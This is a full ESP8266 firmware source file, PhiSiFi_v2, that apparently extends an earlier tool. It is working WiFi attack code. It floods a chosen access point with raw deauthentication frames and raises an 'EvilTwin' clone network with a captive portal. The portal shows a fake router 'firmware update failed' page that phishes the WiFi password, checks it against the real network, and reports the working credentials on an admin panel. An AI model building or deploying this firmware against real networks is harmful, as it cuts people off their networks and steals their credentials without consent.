#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

extern "C" {
#include "user_interface.h"
}

// =============================================================================
//About The PhiSiFi_v2
//This project is a significantly improved version based on the original PhiSiFi project by p3tr0s. It builds upon the foundation of the original project, adding modern technologies and new features.
//
//Acknowledgements
//A special thanks to p3tr0s for the foundational work on the original PhiSiFi project.
//
//The current version has been enriched by 'gravey4rd' with the following key improvements:
//    The user interface and page methods have been improved.
//    Fixed the issue where the deauthentication attack would stop upon refreshing the admin page.
//    Resolved the problem where the deauthentication attack would halt if the modem was reset during the process, using a new method.
//    The EvilTwin interface and system have been optimized.
//    Enabled the EvilTwin and Deauthentication attacks to be run simultaneously.
//    The login notification that prompts the victim to sign in during an EvilTwin attack has been optimized.
//    Ensured that the EvilTwin attack automatically shuts down if the victim turns off the modem and attempts to enter a password on the EvilTwin network.
// =============================================================================

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
} _Network;

const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[20];
_Network _selectedNetwork;

bool is_target_visible = false;
bool hotspot_active = false;
bool deauthing_active = false;

String _correct = "";
String _tryPassword = "";

#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning class='text-4xl text-yellow-500 font-bold'>&#9888;</warning> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br>To revert the old firmware and manually update later, please verify your password."

void clearArray() { for (int i = 0; i < 20; i++) { _networks[i] = _Network(); } }
String bytesToStr(const uint8_t* b, uint32_t size) { String str; for (uint32_t i = 0; i < size; i++) { if (b[i] < 0x10) str += '0'; str += String(b[i], HEX); if (i < size - 1) str += ':'; } str.toUpperCase(); return str; }
void handleEmpty() { webServer.send(204, "text/plain", ""); }
void handleRedirect() { webServer.sendHeader("Location", "http://192.168.4.1/"); webServer.send(302, "text/plain", "Redirecting..."); }

String getSignalQualityHTML(int32_t rssi) {
  String qualityText = "";
  String qualityColor = "";

  if (rssi >= -55) {
    qualityText = "Excellent";
    qualityColor = "#28a745"; 
  } else if (rssi >= -65) {
    qualityText = "Good";
    qualityColor = "#17a2b8"; 
  } else if (rssi >= -75) {
    qualityText = "Fair";
    qualityColor = "#ffc107"; 
  } else if (rssi >= -85) {
    qualityText = "Weak";
    qualityColor = "#fd7e14"; 
  } else {
    qualityText = "Very Weak";
    qualityColor = "#dc3545"; 
  }

  return "<p><strong>Signal:</strong> <span style='color:" + qualityColor + "; font-weight:bold;'>" + qualityText + " (" + String(rssi) + " dBm)</span></p>";
}


void performScan() {
  int n = WiFi.scanNetworks();
  is_target_visible = false;
  clearArray();

  if (n <= 0) {
  } else {
    for (int i = 0; i < n && i < 20; ++i) {
      _networks[i].ssid = WiFi.SSID(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
      _networks[i].ch = WiFi.channel(i);
      _networks[i].rssi = WiFi.RSSI(i);

      if (_selectedNetwork.ssid != "" && _networks[i].ssid == _selectedNetwork.ssid) {
        is_target_visible = true;
        if (memcmp(_networks[i].bssid, _selectedNetwork.bssid, 6) != 0 || _networks[i].ch != _selectedNetwork.ch) {
          memcpy(_selectedNetwork.bssid, _networks[i].bssid, 6);
          _selectedNetwork.ch = _networks[i].ch;
        }
      }
    }
  }
}

String captivePortalHeader(String t) {
  String CSS = "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background-color:#f7f9fb;color:#333;margin:0;padding:0}.container{max-width:600px;margin:0 auto;padding:1.5rem}.card{background-color:#fff;border-radius:1rem;box-shadow:0 4px 6px rgba(0,0,0,.1);padding:2rem;margin-top:2rem}nav{background-color:#2b6cb0;color:#fff;padding:1.5rem;text-align:center;box-shadow:0 2px 4px rgba(0,0,0,.1)}nav b{display:block;font-size:1.5rem;margin-bottom:.5rem}h1{margin-top:0;color:#2d3748;text-align:center;font-size:1.8rem}p{text-align:center;line-height:1.6;margin-bottom:1.5rem;color:#4a5568}label{display:block;margin-bottom:.5rem;font-weight:600;color:#2d3748}input[type=password]{width:100%;padding:.75rem;border:1px solid #e2e8f0;border-radius:.5rem;margin-bottom:1rem;box-sizing:border-box}input[type=submit]{width:100%;padding:.75rem;background-color:#3182ce;color:#fff;border:none;border-radius:.5rem;cursor:pointer;font-size:1rem;font-weight:600;transition:background-color .2s}input[type=submit]:hover{background-color:#2c5282}.footer{text-align:center;margin-top:2rem;font-size:.875rem;color:#a0aec0}";
  String a = String(_selectedNetwork.ssid);
  String h = "<!DOCTYPE html><html><head><title>" + a + " :: " + t + "</title><meta name=viewport content=\"width=device-width,initial-scale=1\"><style>" + CSS + "</style><meta charset=\"UTF-8\"></head><body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div class='container'><div class='card'>";
  return h;
}

String captivePortalFooter() { return "</div><div class='footer'><a>&#169; All rights reserved.</a></div></div></body></html>"; }

String captivePortalIndexPage() { 
  return captivePortalHeader(TITLE) + "<p>" + BODY + "</p><form action='/' method='post'><div><label for='password'>WiFi Password</label><input type='password' id='password' name='password' minlength='8' required placeholder='Enter your WiFi password'></div><input type='submit' value='Verify & Continue'></form></div>" + captivePortalFooter(); 
}

void handleIndex() {
  if (hotspot_active) {
    if (webServer.hasArg("password")) {
      
      if (!is_target_visible) {
        stopEvilTwinAttack(); 
        webServer.send(204, "text/plain", ""); 
        return; 
      }
      
      _tryPassword = webServer.arg("password");
      delay(500);
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.sendHeader("Location", "/result");
      webServer.send(302, "text/plain", "Redirecting...");
      
    } else {
      webServer.send(200, "text/html", captivePortalIndexPage());
    }
  } else {
    webServer.sendHeader("Location", "/admin");
    webServer.send(302, "text/plain", "Redirecting to admin panel...");
  }
}

void handleResult() {
  unsigned long startTime = millis();
  while (millis() - startTime < 10000) {
    wl_status_t status = WiFi.status();
    if (status == WL_CONNECTED) {
      _correct = "SSID: " + _selectedNetwork.ssid + "<br> PASS: " + _tryPassword;
      String successHtml = R"rawliteral(<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><meta http-equiv='refresh' content='5;url=http://www.google.com'><style>body{background-color:#f0fff4;font-family:sans-serif;text-align:center;padding:2rem;}.card{background-color:white;border-radius:1rem;box-shadow:0 4px 6px rgba(0,0,0,0.1);padding:2rem;max-width:400px;margin:2rem auto;}.icon{font-size:3rem;color:#2f855a;}.text{font-size:1.5rem;color:#2f855a;font-weight:bold;margin-top:1rem;}.info{margin-top:0.5rem;color:#4a5568;}</style></head><body><div class='card'><div class='icon'>&#10004;</div><div class='text'>Verification Successful</div><p class='info'>Router settings restored. You will be redirected to the internet shortly.</p></div></body></html>)rawliteral";
      webServer.send(200, "text/html", successHtml);
      delay(100);
      hotspot_active = false;
      deauthing_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("PhiSiFi_v2", "gravey4rd");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
      return;
    }
    if (status == WL_NO_SSID_AVAIL || status == WL_CONNECT_FAILED) {
      break;
    }
    delay(500);
  }
  webServer.send(200, "text/html", R"rawliteral(<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{background-color:#f7f9fb;font-family:sans-serif;text-align:center;padding:2rem;}.card{background-color:white;border-radius:1rem;box-shadow:0 4px 6px rgba(0,0,0,0.1);padding:2rem;max-width:400px;margin:2rem auto;}.error-icon{font-size:3rem;color:#e53e3e;}.error-text{font-size:1.5rem;color:#c53030;font-weight:bold;margin-top:1rem;}.info-text{margin-top:0.5rem;color:#4a5568;}</style><script>setTimeout(function(){window.location.href='/';},4000);</script></head><body><div class='card'><div class='error-icon'>&#8855;</div><div class='error-text'>Wrong Password</div><p class='info-text'>Please, try again.</p></div></body></html>)rawliteral");
}

void handleAdmin() {
  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  webServer.send(200, "text/html", "");
  
  webServer.sendContent("<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>"
                      "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background-color:#f7f9fb;color:#333;margin:0;padding:0}"
                      ".container{max-width:800px;margin:0 auto;padding:1.5rem}.card{background-color:#fff;border-radius:1rem;box-shadow:0 4px 6px rgba(0,0,0,.1);padding:2rem;margin-top:2rem}"
                      "nav{background-color:#2b6cb0;color:#fff;padding:1.5rem;text-align:center;box-shadow:0 2px 4px rgba(0,0,0,.1)}nav b{display:block;font-size:1.5rem;margin-bottom:.5rem}"
                      "h1{margin-top:0;color:#2d3748;text-align:center;font-size:1.8rem}.grid-container{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1rem;margin-top:2rem}"
                      ".grid-card{background-color:#fff;border-radius:.75rem;box-shadow:0 2px 4px rgba(0,0,0,.1);padding:1.5rem;display:flex;flex-direction:column;justify-content:space-between;text-align:center}"
                      ".grid-card h3{margin:0 0 .5rem 0;font-size:1.25rem;color:#2d3748;font-weight:600}.grid-card p{margin:0;font-size:.875rem;color:#718096;text-align:left}"
                      ".grid-card .info{margin-bottom:1rem}.grid-card .button-wrapper{margin-top:auto}button{width:100%;padding:.5rem 1rem;border-radius:.5rem;font-weight:600;cursor:pointer;transition:background-color .2s;border:none}"
                      "button.select-btn{background-color:#48bb78;color:#fff}button.select-btn:hover{background-color:#38a169}button.deauth-btn-start{background-color:#e53e3e;color:#fff}"
                      "button.deauth-btn-stop{background-color:#718096;color:#fff}button.hotspot-btn-start{background-color:#3182ce;color:#fff}"
                      "button.hotspot-btn-stop{background-color:#718096;color:#fff}button:disabled{background-color:#e2e8f0;cursor:not-allowed}button.selected-btn{background-color:#48bb78;color:#fff}"
                      ".button-group{display:flex;gap:1rem;margin-bottom:2rem}.alert-success{background-color:#f0fff4;color:#2f855a;border:1px solid #c6f6d5;padding:1rem;border-radius:.5rem;text-align:center;font-weight:600}"
                      "</style></head><body><nav><b>PhiSiFi_v2</b> ADMIN PANEL</nav><div class='container'><div class='card'><h1>Available Networks</h1><div class='button-group'>");

  String disabled_attr = (_selectedNetwork.ssid == "") ? " disabled" : "";
  if (deauthing_active) { webServer.sendContent("<form method='POST' action='/stop_deauth'><button class='deauth-btn-stop'" + disabled_attr + ">Stop Deauthing</button></form>"); } 
  else { webServer.sendContent("<form method='POST' action='/start_deauth'><button class='deauth-btn-start'" + disabled_attr + ">Start Deauthing</button></form>"); }
  if (hotspot_active) { webServer.sendContent("<form method='POST' action='/stop_hotspot'><button class='hotspot-btn-stop'" + disabled_attr + ">Stop EvilTwin</button></form>"); } 
  else { webServer.sendContent("<form method='POST' action='/start_hotspot'><button class='hotspot-btn-start'" + disabled_attr + ">Start EvilTwin</button></form>"); }

  webServer.sendContent("</div><div class='grid-container'>");

  for (int i = 0; i < 20; ++i) {
    if (_networks[i].ssid == "") break;
    String card_html = "<div class='grid-card'><h3>" + _networks[i].ssid + "</h3>";
    card_html += "<div class='info'>";
    card_html += "<p><strong>BSSID:</strong> " + bytesToStr(_networks[i].bssid, 6) + "</p>";
    card_html += "<p><strong>Channel:</strong> " + String(_networks[i].ch) + "</p>";
    card_html += getSignalQualityHTML(_networks[i].rssi); 
    card_html += "</div>";

    card_html += "<div class='button-wrapper'><form method='POST' action='/select_ap'><input type='hidden' name='ap' value='" + bytesToStr(_networks[i].bssid, 6) + "'>";
    if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) { card_html += "<button class='selected-btn' disabled>Selected</button>"; } 
    else { card_html += "<button class='select-btn'>Select</button>"; }
    card_html += "</form></div></div>";
    webServer.sendContent(card_html);
    yield();
  }

  webServer.sendContent("</div>");
  if (_correct != "") { webServer.sendContent("<div class='alert-success' style='margin-top:20px'><h3>Mission Successful</h3><p>" + _correct + "</p></div>"); }
  webServer.sendContent("</div></div></body></html>");
  webServer.sendContent("");
}

void handleStartDeauth() { deauthing_active = true; webServer.sendHeader("Location", "/admin"); webServer.send(302, "text/plain", ""); }
void handleStopDeauth() { deauthing_active = false; webServer.sendHeader("Location", "/admin"); webServer.send(302, "text/plain", ""); }
void handleStartHotspot() {
  if (_selectedNetwork.ssid != "") {
    hotspot_active = true;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP(_selectedNetwork.ssid.c_str());
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  } 
  webServer.sendHeader("Location", "/admin"); webServer.send(302, "text/plain", "");
}

void stopEvilTwinAttack() {
  hotspot_active = false;
  
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("PhiSiFi_v2", "gravey4rd");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
}

void handleStopHotspot() {
  stopEvilTwinAttack(); 
  webServer.sendHeader("Location", "/admin");
  webServer.send(302, "text/plain", "");
}

void handleSelectAP() {
  if (webServer.hasArg("ap")) {
    String ap_bssid = webServer.arg("ap");
    for (int i = 0; i < 20; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == ap_bssid) {
        _selectedNetwork = _networks[i];
        break;
      }
    }
  }
  webServer.sendHeader("Location", "/admin");
  webServer.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("PhiSiFi_v2", "gravey4rd");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/admin", handleAdmin);
  webServer.on("/result", handleResult);
  
  webServer.on("/select_ap", HTTP_POST, handleSelectAP);
  webServer.on("/start_deauth", HTTP_POST, handleStartDeauth);
  webServer.on("/stop_deauth", HTTP_POST, handleStopDeauth);
  webServer.on("/start_hotspot", HTTP_POST, handleStartHotspot);
  webServer.on("/stop_hotspot", HTTP_POST, handleStopHotspot);

  webServer.on("/generate_204", handleRedirect);
  webServer.on("/hotspot-detect.html", handleRedirect);
  webServer.on("/connectivitycheck.gstatic.com/generate_204", handleRedirect);
  webServer.on("/favicon.ico", handleEmpty);

  webServer.onNotFound(handleRedirect);
  webServer.begin();
}

unsigned long scan_timer = 0;
unsigned long deauth_timer = 0;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (millis() - deauth_timer >= 1000) {
    deauth_timer = millis();
    if (deauthing_active && is_target_visible) {
      wifi_set_channel(_selectedNetwork.ch);
      uint8_t deauthPacket[] = { 0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0xFF, 0x01, 0x00 };
      memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
      memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
      wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    }
  }

  if (millis() - scan_timer >= 15000) {
    scan_timer = millis();
    performScan();
  }
}
